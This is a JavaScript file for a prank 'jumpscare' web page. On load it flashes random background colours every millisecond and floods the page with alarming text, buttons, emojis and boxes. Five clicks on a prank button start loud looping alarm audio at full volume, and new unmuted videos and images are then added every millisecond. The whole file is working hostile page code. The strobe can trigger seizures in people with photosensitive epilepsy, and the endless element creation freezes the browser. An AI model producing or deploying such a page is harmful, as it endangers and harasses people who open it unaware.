document.addEventListener('DOMContentLoaded', () => {
    let clickCount = 0;
    let jumpscareTriggered = false;

    // Function to trigger jumpscare burst (videos, images, and sounds)
    function triggerJumpscareBurst() {
        // Create the warning audio element (50% slower)
        const warningAudio = new Audio('warning.mp3');
        warningAudio.loop = true;  // Loop the warning audio
        warningAudio.volume = 1.0;  // Max volume
        warningAudio.playbackRate = 0.5;  // Slow down by 50%
        warningAudio.play();

        // Create the alarm audio element (normal speed)
        const alarmAudio = new Audio('mixkit-classic-alarm-995.wav');
        alarmAudio.loop = true;  // Loop the alarm audio
        alarmAudio.volume = 1.0;  // Max volume
        alarmAudio.play();

        // Create the "lime-lips" audio (playing on a loop)
        const limeLipsAudio = new Audio('lime-lips.mp3');
        limeLipsAudio.loop = true;  // Loop the lime lips audio
        limeLipsAudio.volume = 1.0;  // Max volume
        limeLipsAudio.play();

        // Create the video element and start the duplication
        function createVideo() {
            const video = document.createElement('video');
            video.src = 'snaptik_7441669924054928672.mp4';  // Path to your MP4 file
            video.style.position = 'absolute';
            video.style.left = `${window.innerWidth / 2}px`;
            video.style.top = `${window.innerHeight / 2}px`;
            video.style.transform = 'translate(-50%, -50%)';
            video.style.zIndex = '1';  // Video stays behind images
            video.autoplay = true;
            video.controls = false;
            video.loop = true;
            video.volume = 1.0;
            video.muted = false;  // Make sure the video plays with sound

            // Append the video to the body
            document.body.appendChild(video);

            // Ensure video plays and is visible
            video.style.width = '20%';  // Start with a smaller size
            video.style.height = 'auto';

            // Start shrinking the video every 0.005 seconds
            setInterval(() => {
                const scale = Math.random() * 0.5 + 0.5;
                video.style.transform = `translate(-50%, -50%) scale(${scale})`;
            }, 5);  // Shrink every 0.005 seconds
        }

        // Call createVideo to create the first video
        createVideo();

        // Create additional videos at intervals of 0.001 seconds
        setInterval(createVideo, 1);  // Add more videos every 0.001 seconds

        // Function to place random images in front of the video
        function placeImage() {
            const img = document.createElement('img');
            img.src = 'tantum.jpg';  // Path to your image
            img.style.position = 'absolute';
            img.style.zIndex = '999';  // Higher z-index to place images in front of the video
            img.style.left = `${Math.random() * 100}%`; // Random horizontal position
            img.style.top = `${Math.random() * 100}%`; // Random vertical position

            // Random size between 50px and 250px
            const randomSize = Math.random() * 200 + 50;
            img.style.width = `${randomSize}px`;
            img.style.height = `${randomSize}px`;

            // Randomly change the size every 0.1 seconds
            setInterval(() => {
                const randomScale = Math.random() * 0.5 + 0.5;  // Random size change factor
                img.style.width = `${randomSize * randomScale}px`;
                img.style.height = `${randomSize * randomScale}px`;
            }, 100);  // Every 0.1 second, resize the image

            // Append the image to the body
            document.body.appendChild(img);
        }

        // Start placing images randomly every 0.001 seconds (more often)
        setInterval(placeImage, 1);  // Place an image every 0.001 second
    }

    function initialTrigger() {
        if (!jumpscareTriggered) {
            jumpscareTriggered = true;
            triggerJumpscareBurst();
        }
    }

    // Flashing random background colors at super high speed
    function flashRandomColors() {
        const colors = [
            '#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff',
            '#ff8000', '#8000ff', '#00ff80', '#ff0080', '#808080', '#ffcc00'
        ];
        
        const flashInterval = 1; // Speed of color flash (in milliseconds)
        
        setInterval(() => {
            const randomColor = colors[Math.floor(Math.random() * colors.length)];
            document.body.style.backgroundColor = randomColor;
        }, flashInterval); // Adjust flashInterval for faster/slower flashing
    }

    // Spam random text on the page, appearing on the lower half of the screen
    function spamRandomText() {
        const textArray = ['Help!', 'Why?', 'Get out!', 'RUN!', 'Why are you here?', 'What is happening?'];
        setInterval(() => {
            const text = textArray[Math.floor(Math.random() * textArray.length)];
            const randomX = Math.random() * window.innerWidth;
            const randomY = Math.random() * (window.innerHeight / 2) + window.innerHeight / 2;  // Lower half of the screen

            const span = document.createElement('span');
            span.innerText = text;
            span.style.position = 'absolute';
            span.style.color = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;  // Random color
            span.style.left = `${randomX}px`;
            span.style.top = `${randomY}px`;
            span.style.fontSize = `${Math.random() * 30 + 10}px`;  // Random font size
            document.body.appendChild(span);
        }, 50); // Faster text spam (every 50ms)
    }

    // Spam random buttons on the lower half of the page
    function spamRandomButtons() {
        setInterval(() => {
            const button = document.createElement('button');
            button.innerText = 'Click me!';
            button.style.position = 'absolute';
            button.style.left = `${Math.random() * window.innerWidth}px`;
            button.style.top = `${Math.random() * (window.innerHeight / 2) + window.innerHeight / 2}px`;  // Lower half of the screen
            button.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;  // Random color
            button.style.fontSize = '15px';
            button.style.zIndex = '99999'; // Ensure the button stays on top of other elements
            document.body.appendChild(button);
        }, 20); // Buttons appear every 20ms
    }

    // Spam random emojis on the lower half of the page
    function spamRandomEmojis() {
        const emojis = ['😊', '😂', '😱', '😈', '🤯', '💀'];
        setInterval(() => {
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            const randomX = Math.random() * window.innerWidth;
            const randomY = Math.random() * (window.innerHeight / 2) + window.innerHeight / 2;  // Lower half of the screen

            const span = document.createElement('span');
            span.innerText = emoji;
            span.style.position = 'absolute';
            span.style.fontSize = `${Math.random() * 30 + 10}px`;  // Random font size
            span.style.left = `${randomX}px`;
            span.style.top = `${randomY}px`;
            document.body.appendChild(span);
        }, 30); // Emojis appear every 30ms
    }

    // Spam random divs with random colors and sizes on the lower half of the page
    function spamRandomDivs() {
        setInterval(() => {
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.left = `${Math.random() * window.innerWidth}px`;
            div.style.top = `${Math.random() * (window.innerHeight / 2) + window.innerHeight / 2}px`;  // Lower half of the screen
            div.style.width = `${Math.random() * 200 + 50}px`;
            div.style.height = `${Math.random() * 200 + 50}px`;
            div.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;  // Random color
            div.style.zIndex = '1';  // Ensure divs are in the background
            document.body.appendChild(div);
        }, 50); // Divs appear every 50ms
    }

    // Initial button click event
    document.getElementById('prankButton').addEventListener('click', () => {
        clickCount++;
        if (clickCount >= 5) {
            initialTrigger(); // Trigger after 5 clicks
        }
    });

    // Call functions to start spamming and flashing
    flashRandomColors();
    spamRandomText();
    spamRandomButtons();
    spamRandomEmojis();
    spamRandomDivs();
});
